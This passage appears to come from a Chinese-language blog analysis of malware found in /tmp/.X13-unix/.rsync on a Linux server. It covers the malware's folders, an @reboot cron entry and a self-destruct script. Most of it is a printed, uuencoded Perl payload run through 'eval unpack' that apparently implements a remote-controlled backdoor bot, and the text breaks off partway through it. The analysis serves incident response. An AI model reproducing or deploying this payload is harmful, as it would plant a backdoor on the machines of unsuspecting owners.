a&#x2F;upd</p>\n<p>b&#x2F;sync<br>@reboot 後 b&#x2F;sync</p>\n<p>&#x2F;tmp&#x2F;.X13-unix&#x2F;.rsync&#x2F;c&#x2F;aptitude</p>\n<p>先來看 a 資料夾</p>\n<p><img src=\"https://i.imgur.com/4omAw3I.png\"></p>\n<p>a&#x2F;a</p>\n<p><img src=\"https://i.imgur.com/YxI5D8p.png\"></p>\n<p>a&#x2F;upd</p>\n<p><img src=\"https://i.imgur.com/LoWQJ9U.png\"></p>\n<p>a&#x2F;stop</p>\n<p><img src=\"https://i.imgur.com/dxkmnum.png\"></p>\n<p>a&#x2F;run</p>\n<p><img src=\"https://i.imgur.com/NZy6EmR.png\"></p>\n<p>a&#x2F;init0</p>\n<p>看起來是自毀程式</p>\n<p><img src=\"https://i.imgur.com/iYZIrHO.png\"></p>\n<p>最後會執行 anacron 這個執行檔案</p>\n<p>再來是 b 資料夾</p>\n<p><img src=\"https://i.imgur.com/zDc1NE8.png\"></p>\n<p>b&#x2F;a</p>\n<p><img src=\"https://i.imgur.com/kqS6OOl.png\"></p>\n<p>b&#x2F;sync</p>\n<p><img src=\"https://i.imgur.com/H6Hdy2a.png\"></p>\n<p>b&#x2F;ps</p>\n<p>二進位執行檔案</p>\n<p>b&#x2F;rsync</p>\n<p><img src=\"https://i.imgur.com/nQgpx0Z.png\"></p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">eval</span> <span class=\"keyword\">unpack</span> <span class=\"string\">u=&gt;</span><span class=\"string\">q&#123;_&quot;FUY(&quot;1P&lt;F]C97-S;R`](&quot;=R&lt;WEN8R&lt;[&quot;@HD&lt;V5R=FED;W(])S4N,C4U+C@V+C$R.2&lt;@=6YL97-S(&quot;1S97)V_:61O&lt;CL*;7D@)&#x27;!O&lt;G1A/2&lt;T-#,G.PIM&gt;2!`8V%N86ES/2@B(S`P-R(I.PIM&gt;2!`861M&lt;STH(D$B+&quot;)8(BD[_&quot;FUY($!A=71H/2@B;&amp;]C86QH;W-T(BD[&quot;@IM&gt;2`D;&amp;EN87-?;6%X/38[&quot;FUY(&quot;1S;&amp;5E&lt;#TS.PH*;7D@)&amp;YI_8VL@/2!G971N:6-K*&quot;D[&quot;FUY(&quot;1I&lt;F-N86UE(#T@9V5T;FEC:R@I.PIM&gt;2`D&lt;F5A;&amp;YA;64@/2`H8&#x27;5N86UE_(&quot;UA8&quot;D[&quot;@IM&gt;2`D86-E&lt;W-O&lt;VAE;&amp;P@/2`Q.PIM&gt;2`D&lt;&#x27;)E9FEX;R`](&quot;(A(&quot;([&quot;FUY(&quot;1E&lt;W1A=&amp;ES=&amp;EC_87,@/2`P.PIM&gt;2`D&lt;&amp;%C;W1E&lt;R`](#$[&quot;@IM&gt;2`D5D524T%/(#T@)S`N,F$G.PH*)%-)1WLG24Y4)WT@/2`G_24=.3U)%)SL*)%-)1WLG2%50)WT@/2`G24=.3U)%)SL*)%-)1WLG5$5232=](#T@)TE&#x27;3D]212&lt;[&quot;B1324=[_)T-(3$0G?2`](&quot;=)1TY/4D4G.PHD4TE&#x27;&gt;R=04R=](#T@)TE&#x27;3D]212&lt;[&quot;@IU&lt;V4@24\\Z.E-O8VME=#L*=7-E_(%-O8VME=#L*=7-E($E/.CI396QE8W0[&quot;F-H9&amp;ER*&quot;(O(BD[&quot;B1S97)V:61O&lt;CTB)$%21U9;,%TB(&amp;EF(&quot;1!_4D=66S!=.PHD,#TB)&#x27;!R;V-E&lt;W-O(BXB7#`B.PIM&gt;2`D&lt;&amp;ED/69O&lt;FL[&quot;F5X:70@:68@)&#x27;!I9#L*9&amp;EE(&quot;)0_&lt;F]B;&amp;5M82!C;VT@;R!F;W)K.B`D(2(@=6YL97-S(&amp;1E9FEN960H)&#x27;!I9&quot;D[&quot;@IM&gt;2`E:7)C7W-E&lt;G9E&lt;G,[_&quot;FUY(&quot;5$0T,[&quot;FUY(&quot;1D8V-?&lt;V5L(#T@;F5W($E/.CI396QE8W0M/FYE=R@I.PH*&quot;@H*&lt;W5B(&amp;=E=&amp;YI8VL@_&gt;PH@(&#x27;)E=&#x27;5R;B`B&gt;&quot;(N:6YT*&#x27;)A;F0H.3`P,&quot;DI.PI]&quot;@H*&lt;W5B(&amp;=E=&amp;ED96YT(&#x27;L*(&quot;!M&gt;2`D&lt;F5T;W)N_;VED96YT(#T@)E]G970H(FAT=&#x27;`Z+R]W=W&lt;N;6EN&lt;&amp;]P+F-O;2]S:S$R&lt;&amp;%C:R]I9&amp;5N=&#x27;,N&lt;&amp;AP(BD[&quot;B`@_;7D@)&amp;ED96YT8VAA;F-E(#T@:6YT*&#x27;)A;F0H,3`P,&quot;DI.PH@(&amp;EF(&quot;@D:61E;G1C:&amp;%N8V4@/B`S,&quot;D@&gt;PH@_(&quot;`@(&#x27;)E=&#x27;5R;B`D;FEC:SL*(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&#x27;)E=&#x27;5R;B`D&lt;F5T;W)N;VED96YT.PH@(&#x27;T*(&quot;!R_971U&lt;FX@)&#x27;)E=&amp;]R;F]I9&amp;5N=#L*?0H*&lt;W5B(&amp;=E=&amp;YA;64@&gt;PH@(&amp;UY(&quot;1R971O&lt;FYO;F%M92`](&quot;9?9V5T_*&quot;)H=&#x27;1P.B\\O=W=W+FUI;G!O&lt;&quot;YC;VTO&lt;VLQ,G!A8VLO;F%M97,N&lt;&amp;AP(BD[&quot;B`@&lt;F5T=7)N(&quot;1R971O&lt;FYO_;F%M93L*?0H*&lt;W5B(&amp;=E=&amp;ED96YT,B![&quot;B`@(&quot;`@(&quot;`@;7D@)&amp;QE;F=T:#US:&amp;EF=#L*(&quot;`@(&quot;`@(&quot;`D;&amp;5N_9W1H(#T@,R!I9B`H)&amp;QE;F=T:&quot;`\\(#,I.PH*(&quot;`@(&quot;`@(&quot;!M&gt;2!`8VAA&lt;G,]*&quot;=A)RXN)WHG+&quot;=!)RXN)UHG_+&quot;&lt;Q)RXN)SDG*3L*(&quot;`@(&quot;`@(&quot;!F;W)E86-H(&quot;@Q+BXD;&amp;5N9W1H*0H@(&quot;`@(&quot;`@(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;1R86YD;VUS=&#x27;)I;F&lt;N/21C:&amp;%R&lt;UMR86YD($!C:&amp;%R&lt;UT[&quot;B`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R_;B`D&lt;F%N9&amp;]M&lt;W1R:6YG.PI]&quot;@IS=6(@9V5T&lt;W1O&lt;F4@*&quot;0D*0I[&quot;B`@;7D@)&#x27;5R;&quot;`](&#x27;-H:69T.PH@(&amp;UY_(&quot;1F:6QE(#T@&lt;VAI9G0[&quot;@H@(&quot;1H=&#x27;1P7W-T&lt;F5A;5]O=70@/2`Q.PH@(&amp;]P96XH1T547T]55$9)3$4L(&quot;(^_(&quot;1F:6QE(BD[&quot;B`@)6AT=&#x27;!?;&amp;]O&lt;%]C:&amp;5C:R`](&quot;@I.PH@(%]G970H)&#x27;5R;&quot;D[&quot;B`@8VQO&lt;V4@1T547T]5_5$9)3$4[&quot;B`@&lt;F5T=7)N(&quot;1M86EN.CIH=&#x27;1P7V=E=%]R97-U;&#x27;0[&quot;GT*&quot;G-U8B!?9V5T&quot;GL*(&quot;!M&gt;2`D=7)L_(#T@&lt;VAI9G0[&quot;B`@;7D@)&#x27;!R;WAY(#T@(B([&quot;B`@9W)E&lt;&quot;![*&amp;QC*&quot;1?*2!E&lt;2`B:&#x27;1T&lt;%]P&lt;F]X&gt;2(I(&quot;8F_(&quot;@D&lt;&#x27;)O&gt;&#x27;D@/2`D14Y6&gt;R1??2E](&amp;ME&gt;7,@)45.5CL*(&quot;!I9B`H*&quot;1P&lt;F]X&gt;2!E&lt;2`B(BD@)B8@)&#x27;5R;&quot;`]_?B!M+%YH=&#x27;1P.B\\O*%M&gt;+SI=*RDH/SHZ*%QD*RDI/R@O7%,J*3\\D+&quot;D@&gt;PH@(&quot;`@;7D@)&amp;AO&lt;W0@/2`D,3L*_(&quot;`@(&amp;UY(&quot;1P;W)T(#T@)#(@?&#x27;P@.#`[&quot;B`@(&quot;!M&gt;2`D&lt;&amp;%T:&quot;`](&quot;0S.PH@(&quot;`@)&#x27;!A=&amp;@@/2`B+R(@=6YL_97-S(&amp;1E9FEN960H)&#x27;!A=&amp;@I.PH@(&quot;`@&lt;F5T=7)N(%]T&lt;FEV:6%L7VAT=&#x27;!?9V5T*&quot;1H;W-T+&quot;`D&lt;&amp;]R=&quot;P@_)&#x27;!A=&amp;@I.PH@(&#x27;T@96QS:68@*&quot;1P&lt;F]X&gt;2`]?B!M+%YH=&#x27;1P.B\\O*%M&gt;+SI=*RDZ*%QD*RDH+UQ3*BD_)&quot;PI_(&#x27;L*(&quot;`@(&amp;UY(&quot;1H;W-T(#T@)#$[&quot;B`@(&quot;!M&gt;2`D&lt;&amp;]R=&quot;`](&quot;0R.PH@(&quot;`@;7D@)&#x27;!A=&amp;@@/2`D=7)L.PH@_(&quot;`@&lt;F5T=7)N(%]T&lt;FEV:6%L7VAT=&#x27;!?9V5T*&quot;1H;W-T+&quot;`D&lt;&amp;]R=&quot;P@)&#x27;!A=&amp;@I.PH@(&#x27;T@96QS92![&quot;B`@_(&quot;!R971U&lt;FX@=6YD968[&quot;B`@?0I]&quot;@H*&lt;W5B(%]T&lt;FEV:6%L7VAT=&#x27;!?9V5T&quot;GL*(&quot;!M&gt;2@D:&amp;]S=&quot;P@)&#x27;!O_&lt;G0L(&quot;1P871H*2`]($!?.PH@(&amp;UY*&quot;1!1T5.5&quot;P@)%9%4E-)3TXL(&quot;1P*3L*&quot;B`@)$%&#x27;14Y4(#T@(F=E=&quot;UM_:6YI;6%L(CL*(&quot;`D5D524TE/3B`](&quot;(R,#`P,#$Q.&quot;([&quot;@H@(&quot;1P871H(#U^(&#x27;,O(&quot;\\E,C`O9SL*&quot;B`@&lt;F5Q_=6ER92!)3SHZ4V]C:V5T.PH@(&amp;QO8V%L*&quot;1&gt;5RD@/2`P.PH@(&amp;UY(&quot;1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%_5&quot;T^;F5W*%!E97)!9&amp;1R(#T^(&quot;1H;W-T+`H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%!E_97)0;W)T(#T^(&quot;1P;W)T+`H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%!R;W1O(&quot;`@/3X@_)W1C&lt;&quot;&lt;L&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@5&amp;EM96]U=&quot;`@/3X@-C`I(&#x27;Q\\(&#x27;)E_=&#x27;5R;CL*(&quot;`D&lt;V]C:RT^875T;V9L=7-H.PH@(&amp;UY(&quot;1N971L;V,@/2`D:&amp;]S=#L*(&quot;`D;F5T;&amp;]C(&quot;X](&quot;(Z_)&#x27;!O&lt;G0B(&amp;EF(&quot;1P;W)T(&quot;$](#@P.PH@(&amp;UY(&quot;1R97%U97-T(#T@(D=%5&quot;`D&lt;&amp;%T:&quot;!(5%10+S$N,%PP,35&lt;_,#$R(@H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;X@(DAO&lt;W0Z(&quot;1N971L;V-&lt;,#$U7#`Q,B(*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`N(&quot;)5_&lt;V5R+4%G96YT.B`D04=%3E0O)%9%4E-)3TXO=5PP,35&lt;,#$R(CL*(&quot;`D&lt;F5Q=65S=&quot;`N/2`B4&#x27;)A9VUA.B!N_;RUC86-H95PP,35&lt;,#$R(B!I9B`H)&amp;UA:6XZ.FAT=&#x27;!?;F]?8V%C:&amp;4I.PH@(&quot;1R97%U97-T(&quot;X](&quot;)&lt;,#$U_7#`Q,B([&quot;B`@&lt;&#x27;)I;G0@)&#x27;-O8VL@)&#x27;)E&lt;75E&lt;W0[&quot;@H@(&amp;UY(&quot;1B=68@/2`B(CL*(&quot;!M&gt;2`D;CL*(&quot;!M&gt;2`D_8C$@/2`B(CL*(&quot;!W:&amp;EL92`H)&amp;X@/2!S&gt;7-R96%D*&quot;1S;V-K+&quot;`D8G5F+&quot;`X*C$P,C0L(&amp;QE;F=T:&quot;@D8G5F_*2DI(&#x27;L*(&quot;`@(&amp;EF(&quot;@D8C$@97$@(B(I(&#x27;L@&quot;B`@(&quot;`@(&quot;1B,2`](&quot;1B=68[(&quot;`@(&quot;`@(&quot;`@&quot;B`@(&quot;`@(&quot;1B_=68@/7X@&lt;R\\N*S]&lt;,#$U/UPP,3)&lt;,#$U/UPP,3(O+W,[(&quot;`@(&quot;`@&quot;B`@(&quot;!]&quot;B`@(&quot;!I9B`H)&amp;AT=&#x27;!?&lt;W1R_96%M7V]U=&quot;D@&gt;R!P&lt;FEN=&quot;!&#x27;151?3U541DE,12`D8G5F.R`D8G5F(#T@(B([(&#x27;T*(&quot;!]&quot;B`@&lt;F5T=7)N(&#x27;5N_9&amp;5F(&#x27;5N;&amp;5S&lt;R!D969I;F5D*&quot;1N*3L*&quot;B`@)&amp;UA:6XZ.FAT=&#x27;!?9V5T7W)E&lt;W5L=&quot;`](#(P,#L*(&quot;!I9B`H_)&amp;(Q(#U^(&amp;TL7DA45%`O7&amp;0K7&quot;Y&lt;9&quot;M&lt;&lt;RLH7&amp;0K*5M&gt;7#`Q,ETJ7#`Q,BPI(&#x27;L*(&quot;`@(&quot;1M86EN.CIH=&#x27;1P_7V=E=%]R97-U;&#x27;0@/2`D,3L*(&quot;`@(&amp;EF(&quot;@D;6%I;CHZ:&#x27;1T&lt;%]G971?&lt;F5S=6QT(#U^(&quot;]&gt;,S!;,3(S-UTO_(&quot;8F(&quot;1B,2`]?B`O7#`Q,DQO8V%T:6]N.EQS*BA&lt;4RLI+PHI(&#x27;L*(&quot;`@(&quot;`@;7D@)&#x27;5R;&quot;`](&quot;0Q.PH@(&quot;`@_(&quot;!R971U&lt;FX@=6YD968@:68@)&amp;AT=&#x27;!?;&amp;]O&lt;%]C:&amp;5C:WLD=7)L?2LK.PH@(&quot;`@(&quot;!R971U&lt;FX@7V=E=&quot;@D_=7)L*3L*(&quot;`@(&#x27;T*(&quot;`@(&#x27;)E=&#x27;5R;B!U;F1E9B!U;FQE&lt;W,@)&amp;UA:6XZ.FAT=&#x27;!?9V5T7W)E&lt;W5L=&quot;`]?B`O_7C(O.PH@(&#x27;T*&quot;B`@&lt;F5T=7)N(&quot;1B=68[&quot;GT*&quot;@HD&lt;V5L7V-L:65N=&amp;4@/2!)3SHZ4V5L96-T+3YN97&lt;H*3L*_&lt;W5B(&#x27;-E;F1R87&lt;@&gt;PH@(&amp;EF(&quot;@D(U\\@/3T@)S$G*2![&quot;B`@(&quot;!M&gt;2`D&lt;V]C:V5T(#T@)%];,%T[&quot;B`@(&quot;!P_&lt;FEN=&quot;`D&lt;V]C:V5T(&quot;(D7ULQ75QN(CL*(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&quot;!P&lt;FEN=&quot;`D25)#7V-U&lt;E]S;V-K970@_(B1?6S!=7&amp;XB.PH@(&#x27;T*?0H*&lt;W5B(&amp;-O;F5C=&amp;%R(&#x27;L*(&quot;`@;7D@)&amp;UE=6YI8VL@/2`D7ULP73L*(&quot;`@;7D@_)&#x27;-E&lt;G9I9&amp;]R7V-O;B`](&quot;1?6S%=.PH@(&quot;!M&gt;2`D&lt;&amp;]R=&amp;%?8V]N(#T@)%];,ET[&quot;@H@(&quot;!M&gt;2`D25)#7W-O_8VME=&quot;`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0&lt;F]T;ST^(G1C&lt;&quot;(L(%!E97)!9&amp;1R/3XB)&#x27;-E&lt;G9I9&amp;]R_7V-O;B(L(%!E97)0;W)T/3XD&lt;&amp;]R=&amp;%?8V]N*2!O&lt;B!R971U&lt;FXH,2D[&quot;B`@(&amp;EF(&quot;AD969I;F5D*&quot;1)4D-?_&lt;V]C:V5T*2D@&gt;PH@(&quot;`@(&quot;1)4D-?8W5R7W-O8VME=&quot;`](&quot;1)4D-?&lt;V]C:V5T.PH*(&quot;`@(&quot;`D25)#7W-O8VME_=&quot;T^875T;V9L=7-H*#$I.PH@(&quot;`@(&quot;1S96Q?8VQI96YT92T^861D*&quot;1)4D-?&lt;V]C:V5T*3L*&quot;B`@(&quot;`@)&amp;ER_8U]S97)V97)S&gt;R1)4D-?8W5R7W-O8VME=&#x27;U[)VAO&lt;W0G?2`](&quot;(D&lt;V5R=FED;W)?8V]N(CL*(&quot;`@(&quot;`D:7)C_7W-E&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG&lt;&amp;]R=&amp;$G?2`](&quot;(D&lt;&amp;]R=&amp;%?8V]N(CL*(&quot;`@(&quot;`D:7)C7W-E_&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG;FEC:R=](#T@)&amp;UE=6YI8VL[&quot;B`@(&quot;`@)&amp;ER8U]S97)V97)S&gt;R1)_4D-?8W5R7W-O8VME=&#x27;U[)VUE=6EP)WT@/2`D25)#7W-O8VME=&quot;T^&lt;V]C:VAO&lt;W0[&quot;B`@(&quot;`@;FEC:R@B)&amp;UE_=6YI8VLB*3L*(&quot;`@(&quot;!S96YD&lt;F%W*&quot;)54T52(&quot;1I&lt;F-N86UE(&quot;(N)$E20U]S;V-K970M/G-O8VMH;W-T+B(@_)&#x27;-E&lt;G9I9&amp;]R7V-O;B`Z)&#x27;)E86QN86UE(BD[&quot;B`@(&quot;`@&lt;VQE97`@,CL*(&quot;`@?0H*?0IM&gt;2`D;&amp;EN95]T96UP_.PIW:&amp;EL92@@,2`I(&#x27;L*(&quot;`@=VAI;&amp;4@*&quot;$H:V5Y&lt;R@E:7)C7W-E&lt;G9E&lt;G,I*2D@&gt;R!C;VYE8W1A&lt;B@B)&amp;YI_8VLB+&quot;`B)&#x27;-E&lt;G9I9&amp;]R(BP@(B1P;W)T82(I.R!]&quot;B`@(&amp;1E;&amp;5T92@D:7)C7W-E&lt;G9E&lt;G-[)R=]*2!I9B`H_9&amp;5F:6YE9&quot;@D:7)C7W-E&lt;G9E&lt;G-[)R=]*2D[&quot;B`@(&quot;9$0T,Z.F-O;FYE8W1I;VYS.PH@(&quot;!M&gt;2!`&lt;F5A9&#x27;D@_/2`D&lt;V5L7V-L:65N=&amp;4M/F-A;E]R96%D*#`N-BD[&quot;B`@(&amp;YE&gt;&#x27;0@=6YL97-S*$!R96%D&gt;2D[&quot;B`@(&amp;9O&lt;F5A_8V@@)&amp;9H(&quot;A`&lt;F5A9&#x27;DI(&#x27;L*(&quot;`@(&quot;`D25)#7V-U&lt;E]S;V-K970@/2`D9F@[&quot;B`@(&quot;`@)&amp;UE=6YI8VL@/2`D_:7)C7W-E&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG;FEC:R=].PH@(&quot;`@(&quot;1N&lt;F5A9&quot;`](&#x27;-Y&lt;W)E860H)&amp;9H_+&quot;`D;7-G+&quot;`T,#DV*3L*(&quot;`@(&quot;!I9B`H)&amp;YR96%D(#T](#`I(&#x27;L*(&quot;`@(&quot;`@(&quot;`D&lt;V5L7V-L:65N=&amp;4M/G)E_;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;1F:&quot;T^8VQO&lt;V4[&quot;B`@(&quot;`@(&quot;`@9&amp;5L971E*&quot;1I&lt;F-?&lt;V5R=F5R&lt;WLD9FA]_*3L*(&quot;`@(&quot;!]&quot;B`@(&quot;`@0&amp;QI;F5S(#T@&lt;W!L:70@*&quot;]&lt;;B\\L(&quot;1M&lt;V&lt;I.PH*(&quot;`@(&quot;!F;W(H;7D@)&amp;,],#L@_)&amp;,\\/2`D(VQI;F5S.R`D8RLK*2![&quot;B`@(&quot;`@(&quot;`D;&amp;EN92`](&quot;1L:6YE&lt;ULD8UT[&quot;B`@(&quot;`@(&quot;`D;&amp;EN93TD_;&amp;EN95]T96UP+B1L:6YE(&amp;EF(&quot;@D;&amp;EN95]T96UP*3L*(&quot;`@(&quot;`@(&quot;1L:6YE7W1E;7`])R&lt;[&quot;B`@(&quot;`@(&quot;`D_;&amp;EN92`]?B!S+UQR)&quot;\\O.PH@(&quot;`@(&quot;`@=6YL97-S(&quot;@D8R`]/2`D(VQI;F5S*2![&quot;B`@(&quot;`@(&quot;`@(&#x27;!A&lt;G-E_*&quot;(D;&amp;EN92(I.PH@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&quot;-L:6YE&lt;R`]/2`P*2![&quot;B`@(&quot;`@_(&quot;`@(&quot;`@(&quot;!P87)S92@B)&amp;QI;F4B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D;&amp;EN97-;)&amp;-=(#U^(&quot;]&lt;&lt;B0O_*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;!A&lt;G-E*&quot;(D;&amp;EN92(I.PH@(&quot;`@(&quot;`@(&quot;`@(&#x27;T@96QS:68@*&quot;1L:6YE(#U^_(&quot;]&gt;*%Q3*RD@3D]424-%($%55$@@.EPJ7&quot;I&lt;*B\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;&amp;%R&lt;V4H(B1L:6YE(BD[_&quot;B`@(&quot;`@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;QI;F5?=&amp;5M&lt;&quot;`](&quot;1L:6YE.PH@(&quot;`@(&quot;`@_(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@?0H@(&quot;!]&quot;GT*&quot;G-U8B!P87)S92![&quot;B`@(&amp;UY(&quot;1S97)V87)G(#T@&lt;VAI_9G0[&quot;B`@(&amp;EF(&quot;@D&lt;V5R=F%R9R`]?B`O7E!)3D&lt;@7#HH+BHI+RD@&gt;PH@(&quot;`@(&#x27;-E;F1R87&lt;H(E!/3D&lt;@.B0Q_(BD[&quot;B`@(&#x27;T@96QS:68@*&quot;1S97)V87)G(#U^(&quot;]&gt;7#HH+BL_*5PA*&quot;XK/RE&lt;0&quot;@N*S\\I(%!2259-4T&lt;@*&quot;XK_/RD@7#HH+BLI+RD@&gt;PH@(&quot;`@(&quot;`@;7D@)&#x27;!N/20Q.R!M&gt;2`D;VYD92`](&quot;0T.R!M&gt;2`D87)G&lt;R`](&quot;0U.PH@_(&quot;`@(&quot;`@:68@*&quot;1A&lt;F=S(#U^(&quot;]&gt;7#`P,59%4E-)3TY&lt;,#`Q)&quot;\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@;F]T:6-E*&quot;(D&lt;&amp;XB_+&quot;`B7#`P,59%4E-)3TX@;4E20R!V-BXQ-B!%3D4@04Q)3B!&#x27;04)2245,7#`P,2(I.PH@(&quot;`@(&quot;`@?0H@(&quot;`@_(&quot;`@96QS:68@*&quot;1A&lt;F=S(#U^(&quot;]&gt;7#`P,5!)3D=&lt;&lt;RLH7&amp;0K*5PP,#$D+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;!N;W1I8V4H_(B1P;B(L(&quot;)&lt;,#`Q4$].1UPP,#$B*3L*(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;AG&lt;F5P(&#x27;LD7R`]?B`O7EQ1_)&#x27;!N7$4D+VD@?2!`861M&lt;RD@&gt;PH@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;]N9&amp;4@97$@(B1M975N:6-K(BE[&quot;B`@(&quot;`@(&quot;`@_(&quot;`@&lt;VAE;&amp;PH(B1P;B(L(&quot;(D87)G&lt;R(I.PH@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@96QS:68@*&quot;1A&lt;F=S(#U^_(&quot;]&gt;*%Q1)&amp;UE=6YI8VM&lt;17Q&lt;421P&lt;F5F:7AO7$4I7&#x27;,K*&quot;XJ*2\\@*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1N871R_:7@@/2`D,3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;%R9R`](&quot;0R.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;%R9R`]?B`O7EPA_*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I&lt;F-A&lt;V4H(B1P;B(L(B1O;F1E(BPB)#$B*2!U;FQE&lt;W,@*&quot;1N871R_:7@@97$@(B1P&lt;F5F:7AO(B!A;F0@)&amp;%R9R`]?B`O7EPA;FEC:R\\I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D_87)G(#U^(&quot;]&gt;7$`H+BHI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;]N9&amp;5P(#T@)&amp;]N9&amp;4[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`D;VYD97`@/2`D&lt;&amp;X@:68@)&amp;]N9&amp;4@97$@)&amp;UE=6YI8VL[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!B9G5N8R@B_)&amp;]N9&amp;5P(BPB)#$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-H96QL*&quot;(D;VYD_92(L(&quot;(D87)G(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@?0H@(&quot;!](&amp;5L&lt;VEF(&quot;@D&lt;V5R_=F%R9R`]?B`O7EPZ*&quot;XK/RE&lt;(2@N*S\\I7$`H+BL_*5QS*TY)0TM&lt;&lt;RM&lt;.BA&lt;4RLI+VDI(&#x27;L*(&quot;`@(&quot;`@(&amp;EF_(&quot;AL8R@D,2D@97$@;&amp;,H)&amp;UE=6YI8VLI*2![&quot;B`@(&quot;`@(&quot;`@(&quot;1M975N:6-K/20T.PH@(&quot;`@(&quot;`@(&quot;`D:7)C_7W-E&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG;FEC:R=](#T@)&amp;UE=6YI8VL[&quot;B`@(&quot;`@(&quot;!]&quot;B`@(&#x27;T@96QS_:68@*&quot;1S97)V87)G(#U^(&amp;TO7EPZ*&quot;XK/RE&lt;&lt;RLT,S,O:2D@&gt;PH@(&quot;`@(&quot;`@)&amp;UE=6YI8VL@/2!G971N:6-K_*&quot;D[&quot;B`@(&quot;`@(&quot;!N:6-K*&quot;(D;65U;FEC:R(I.PH@(&quot;!](&amp;5L&lt;VEF(&quot;@D&lt;V5R=F%R9R`]?B!M+UY&lt;.B@N*S\\I_7&#x27;,K,#`Q7&#x27;,K*%Q3*RE&lt;&lt;R]I*2![&quot;B`@(&quot;`@(&quot;`D;65U;FEC:R`](&quot;0R.PH@(&quot;`@(&quot;`@)&amp;ER8U]S97)V97)S_&gt;R1)4D-?8W5R7W-O8VME=&#x27;U[)VYI8VLG?2`](&quot;1M975N:6-K.PH@(&quot;`@(&quot;`@)&amp;ER8U]S97)V97)S&gt;R1)4D-?_8W5R7W-O8VME=&#x27;U[)VYO;64G?2`](&quot;(D,2([&quot;B`@(&quot;`@(&quot;!F;W)E86-H(&amp;UY(&quot;1C86YA;&quot;`H0&amp;-A;F%I&lt;RD@_&gt;PH@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;)*3TE.(&quot;1C86YA;&quot;(I.PH@(&quot;`@(&quot;`@?0H@(&quot;!]&quot;GT*&quot;G-U8B!B9G5N8R![_&quot;B`@;7D@)&#x27;!R:6YT;&quot;`](&quot;1?6S!=.PH@(&amp;UY(&quot;1F=6YC87)G(#T@)%];,5T[&quot;B`@:68@*&amp;UY(&quot;1P:60@/2!F_;W)K*2![&quot;B`@(&quot;`@=V%I=&#x27;!I9&quot;@D&lt;&amp;ED+&quot;`P*3L*(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&quot;!I9B`H9F]R:RD@&gt;PH@(&quot;`@_(&quot;`@(&quot;!E&gt;&amp;ET.PH@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;9U;F-A&lt;F&lt;@/7X@+UYP;W)T&lt;V-A_;B`H+BHI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;AO&lt;W1I&lt;#TB)#$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@0&#x27;!O&lt;G1A_&lt;STH(C(Q(BPB,C(B+&quot;(R,R(L(C(U(BPB-3,B+&quot;(X,&quot;(L(C$Q,&quot;(L(C$T,R(L(C8V-C4B*3L*(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;UY(&quot;A`86)E&lt;G1A+&quot;`E&lt;&amp;]R=&amp;%?8F%N;F5R*3L*(